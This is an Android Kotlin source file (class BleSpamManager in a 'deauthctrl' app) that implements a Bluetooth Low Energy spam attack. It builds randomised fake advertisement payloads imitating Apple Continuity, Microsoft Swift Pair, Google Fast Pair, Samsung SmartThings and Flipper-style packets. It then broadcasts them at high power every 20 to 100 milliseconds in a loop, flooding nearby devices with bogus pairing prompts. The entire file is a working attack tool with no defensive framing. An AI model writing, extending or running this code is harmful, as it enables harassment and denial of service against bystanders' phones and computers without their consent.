package xin.ctkqiang.deauthctrl.manager

import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothManager
import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseData
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.BluetoothLeAdvertiser
import android.content.Context
import android.os.ParcelUuid
import xin.ctkqiang.deauthctrl.model.BleAdvertLogEntry
import xin.ctkqiang.deauthctrl.model.BlePayloadProfile
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import java.util.UUID

class BleSpamManager(private val context: Context) {

    private val bluetoothManager = context.getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager
    private val adapter: BluetoothAdapter? = bluetoothManager.adapter
    private var advertiser: BluetoothLeAdvertiser? = null
    private var advertiseJob: Job? = null
    private val scope = CoroutineScope(Dispatchers.Main + SupervisorJob())

    private val _log = MutableStateFlow<List<BleAdvertLogEntry>>(emptyList())
    val log: StateFlow<List<BleAdvertLogEntry>> = _log.asStateFlow()

    private val _isRunning = MutableStateFlow(false)
    val isRunning: StateFlow<Boolean> = _isRunning.asStateFlow()

    private val _error = MutableStateFlow<String?>(null)
    val error: StateFlow<String?> = _error.asStateFlow()

    private var currentProfile = BlePayloadProfile.ALL
    private var advertiseIntervalMs = 30L
    private var packetIndex = 0
    private var failCount = 0
    private var activeAdv: BluetoothLeAdvertiser? = null
    private var activeCb: AdvertiseCallback? = null

    fun setProfile(profile: BlePayloadProfile) { currentProfile = profile }
    fun setInterval(intervalMs: Long) { advertiseIntervalMs = intervalMs.coerceIn(20, 100) }
    fun getCurrentProfile() = currentProfile
    fun getCurrentInterval() = advertiseIntervalMs

    fun start() {
        if (_isRunning.value) return
        val bt = adapter ?: run { _error.value = "no bluetooth adapter"; return }
        if (!bt.isEnabled) { _error.value = "bluetooth is off"; return }
        advertiser = bt.bluetoothLeAdvertiser
        if (advertiser == null) { _error.value = "BLE advertising not supported"; return }

        _isRunning.value = true; _error.value = null; packetIndex = 0; failCount = 0
        advertiseJob = scope.launch(Dispatchers.Default) { spamLoop() }
    }

    fun stop() {
        _isRunning.value = false; advertiseJob?.cancel()
        try { activeAdv?.stopAdvertising(activeCb!!) } catch (_: Exception) {}
        activeAdv = null; activeCb = null; advertiser = null
    }

    fun clearLog() { _log.value = emptyList(); packetIndex = 0; failCount = 0 }
    fun destroy() { stop(); scope.cancel() }

    private suspend fun spamLoop() {
        var cycle = 0
        while (_isRunning.value) {
            val profile = resolveNextProfile()
            val payload = buildPayload(profile) ?: continue
            sendOne(profile, payload)
            delay(advertiseIntervalMs)
            cycle++
            if (cycle % 100 == 0 && failCount > cycle / 2) {
                _error.value = "high failure rate ($failCount/$cycle) -- try reducing interval"
            }
        }
    }

    private fun resolveNextProfile(): BlePayloadProfile {
        return when (currentProfile) {
            BlePayloadProfile.ALL -> {
                val profiles = BlePayloadProfile.entries.filter { it != BlePayloadProfile.ALL }
                profiles[packetIndex % profiles.size]
            }
            else -> currentProfile
        }
    }

    private fun sendOne(profile: BlePayloadProfile, data: ByteArray) {
        val adv = advertiser ?: return

        try { activeAdv?.stopAdvertising(activeCb!!) } catch (_: Exception) {}

        val settings = AdvertiseSettings.Builder()
            .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
            .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
            .setConnectable(false).build()

        val advData = AdvertiseData.Builder()
            .addManufacturerData(0xFFFF, data)
            .setIncludeDeviceName(false).setIncludeTxPowerLevel(false).build()

        val cb = object : AdvertiseCallback() {
            override fun onStartSuccess(s: AdvertiseSettings?) {
                packetIndex++; failCount = maxOf(0, failCount - 1)
                appendLog(BleAdvertLogEntry(profile = profile, payloadHex = data.toHexString(),
                    payloadBytes = data, success = true, index = packetIndex, txPowerLevel = "HIGH"))
            }
            override fun onStartFailure(code: Int) {
                packetIndex++; failCount++
                appendLog(BleAdvertLogEntry(profile = profile, payloadHex = data.toHexString(),
                    payloadBytes = data, success = false, index = packetIndex, txPowerLevel = "HIGH"))
            }
        }
        try {
            adv.startAdvertising(settings, advData, cb)
            activeAdv = adv; activeCb = cb
        } catch (e: SecurityException) {
            _error.value = "permission denied: BLUETOOTH_ADVERTISE"
        } catch (e: Exception) {
            _error.value = "advertise error: ${e.message}"
        }
    }

    private fun buildPayload(profile: BlePayloadProfile): ByteArray? {
        return when (profile) {
            BlePayloadProfile.APPLE_CONTINUITY -> byteArrayOf(0x4C, 0x00, byteArrayOf(0x05, 0x07, 0x0B, 0x0C, 0x10).random(), 0x02) + rand(17)
            BlePayloadProfile.MICROSOFT_SWIFT_PAIR -> byteArrayOf(0x06, 0x00, 0x01, 0x03) + rand(12)
            BlePayloadProfile.GOOGLE_FAST_PAIR -> byteArrayOf(0x00, 0x02) + byteArrayOf(0x71, 0x8C.toByte(), 0x10) + rand(8)
            BlePayloadProfile.SAMSUNG_SMARTTHINGS -> byteArrayOf(0x75, 0x00, byteArrayOf(0x01, 0x02, 0x03).random(), 0x00) + rand(12)
            BlePayloadProfile.FLIPPER_STYLE -> byteArrayOf(0xFF.toByte(), 0xFF.toByte()) + rand(20)
            BlePayloadProfile.ALL -> buildPayload(BlePayloadProfile.entries.filter { it != BlePayloadProfile.ALL }.random())
        }
    }

    private fun rand(c: Int) = ByteArray(c).also { kotlin.random.Random.nextBytes(it) }
    private fun ByteArray.toHexString() = joinToString("") { "%02X".format(it) }
    private fun appendLog(e: BleAdvertLogEntry) { _log.value = (_log.value + e).takeLast(200) }
}
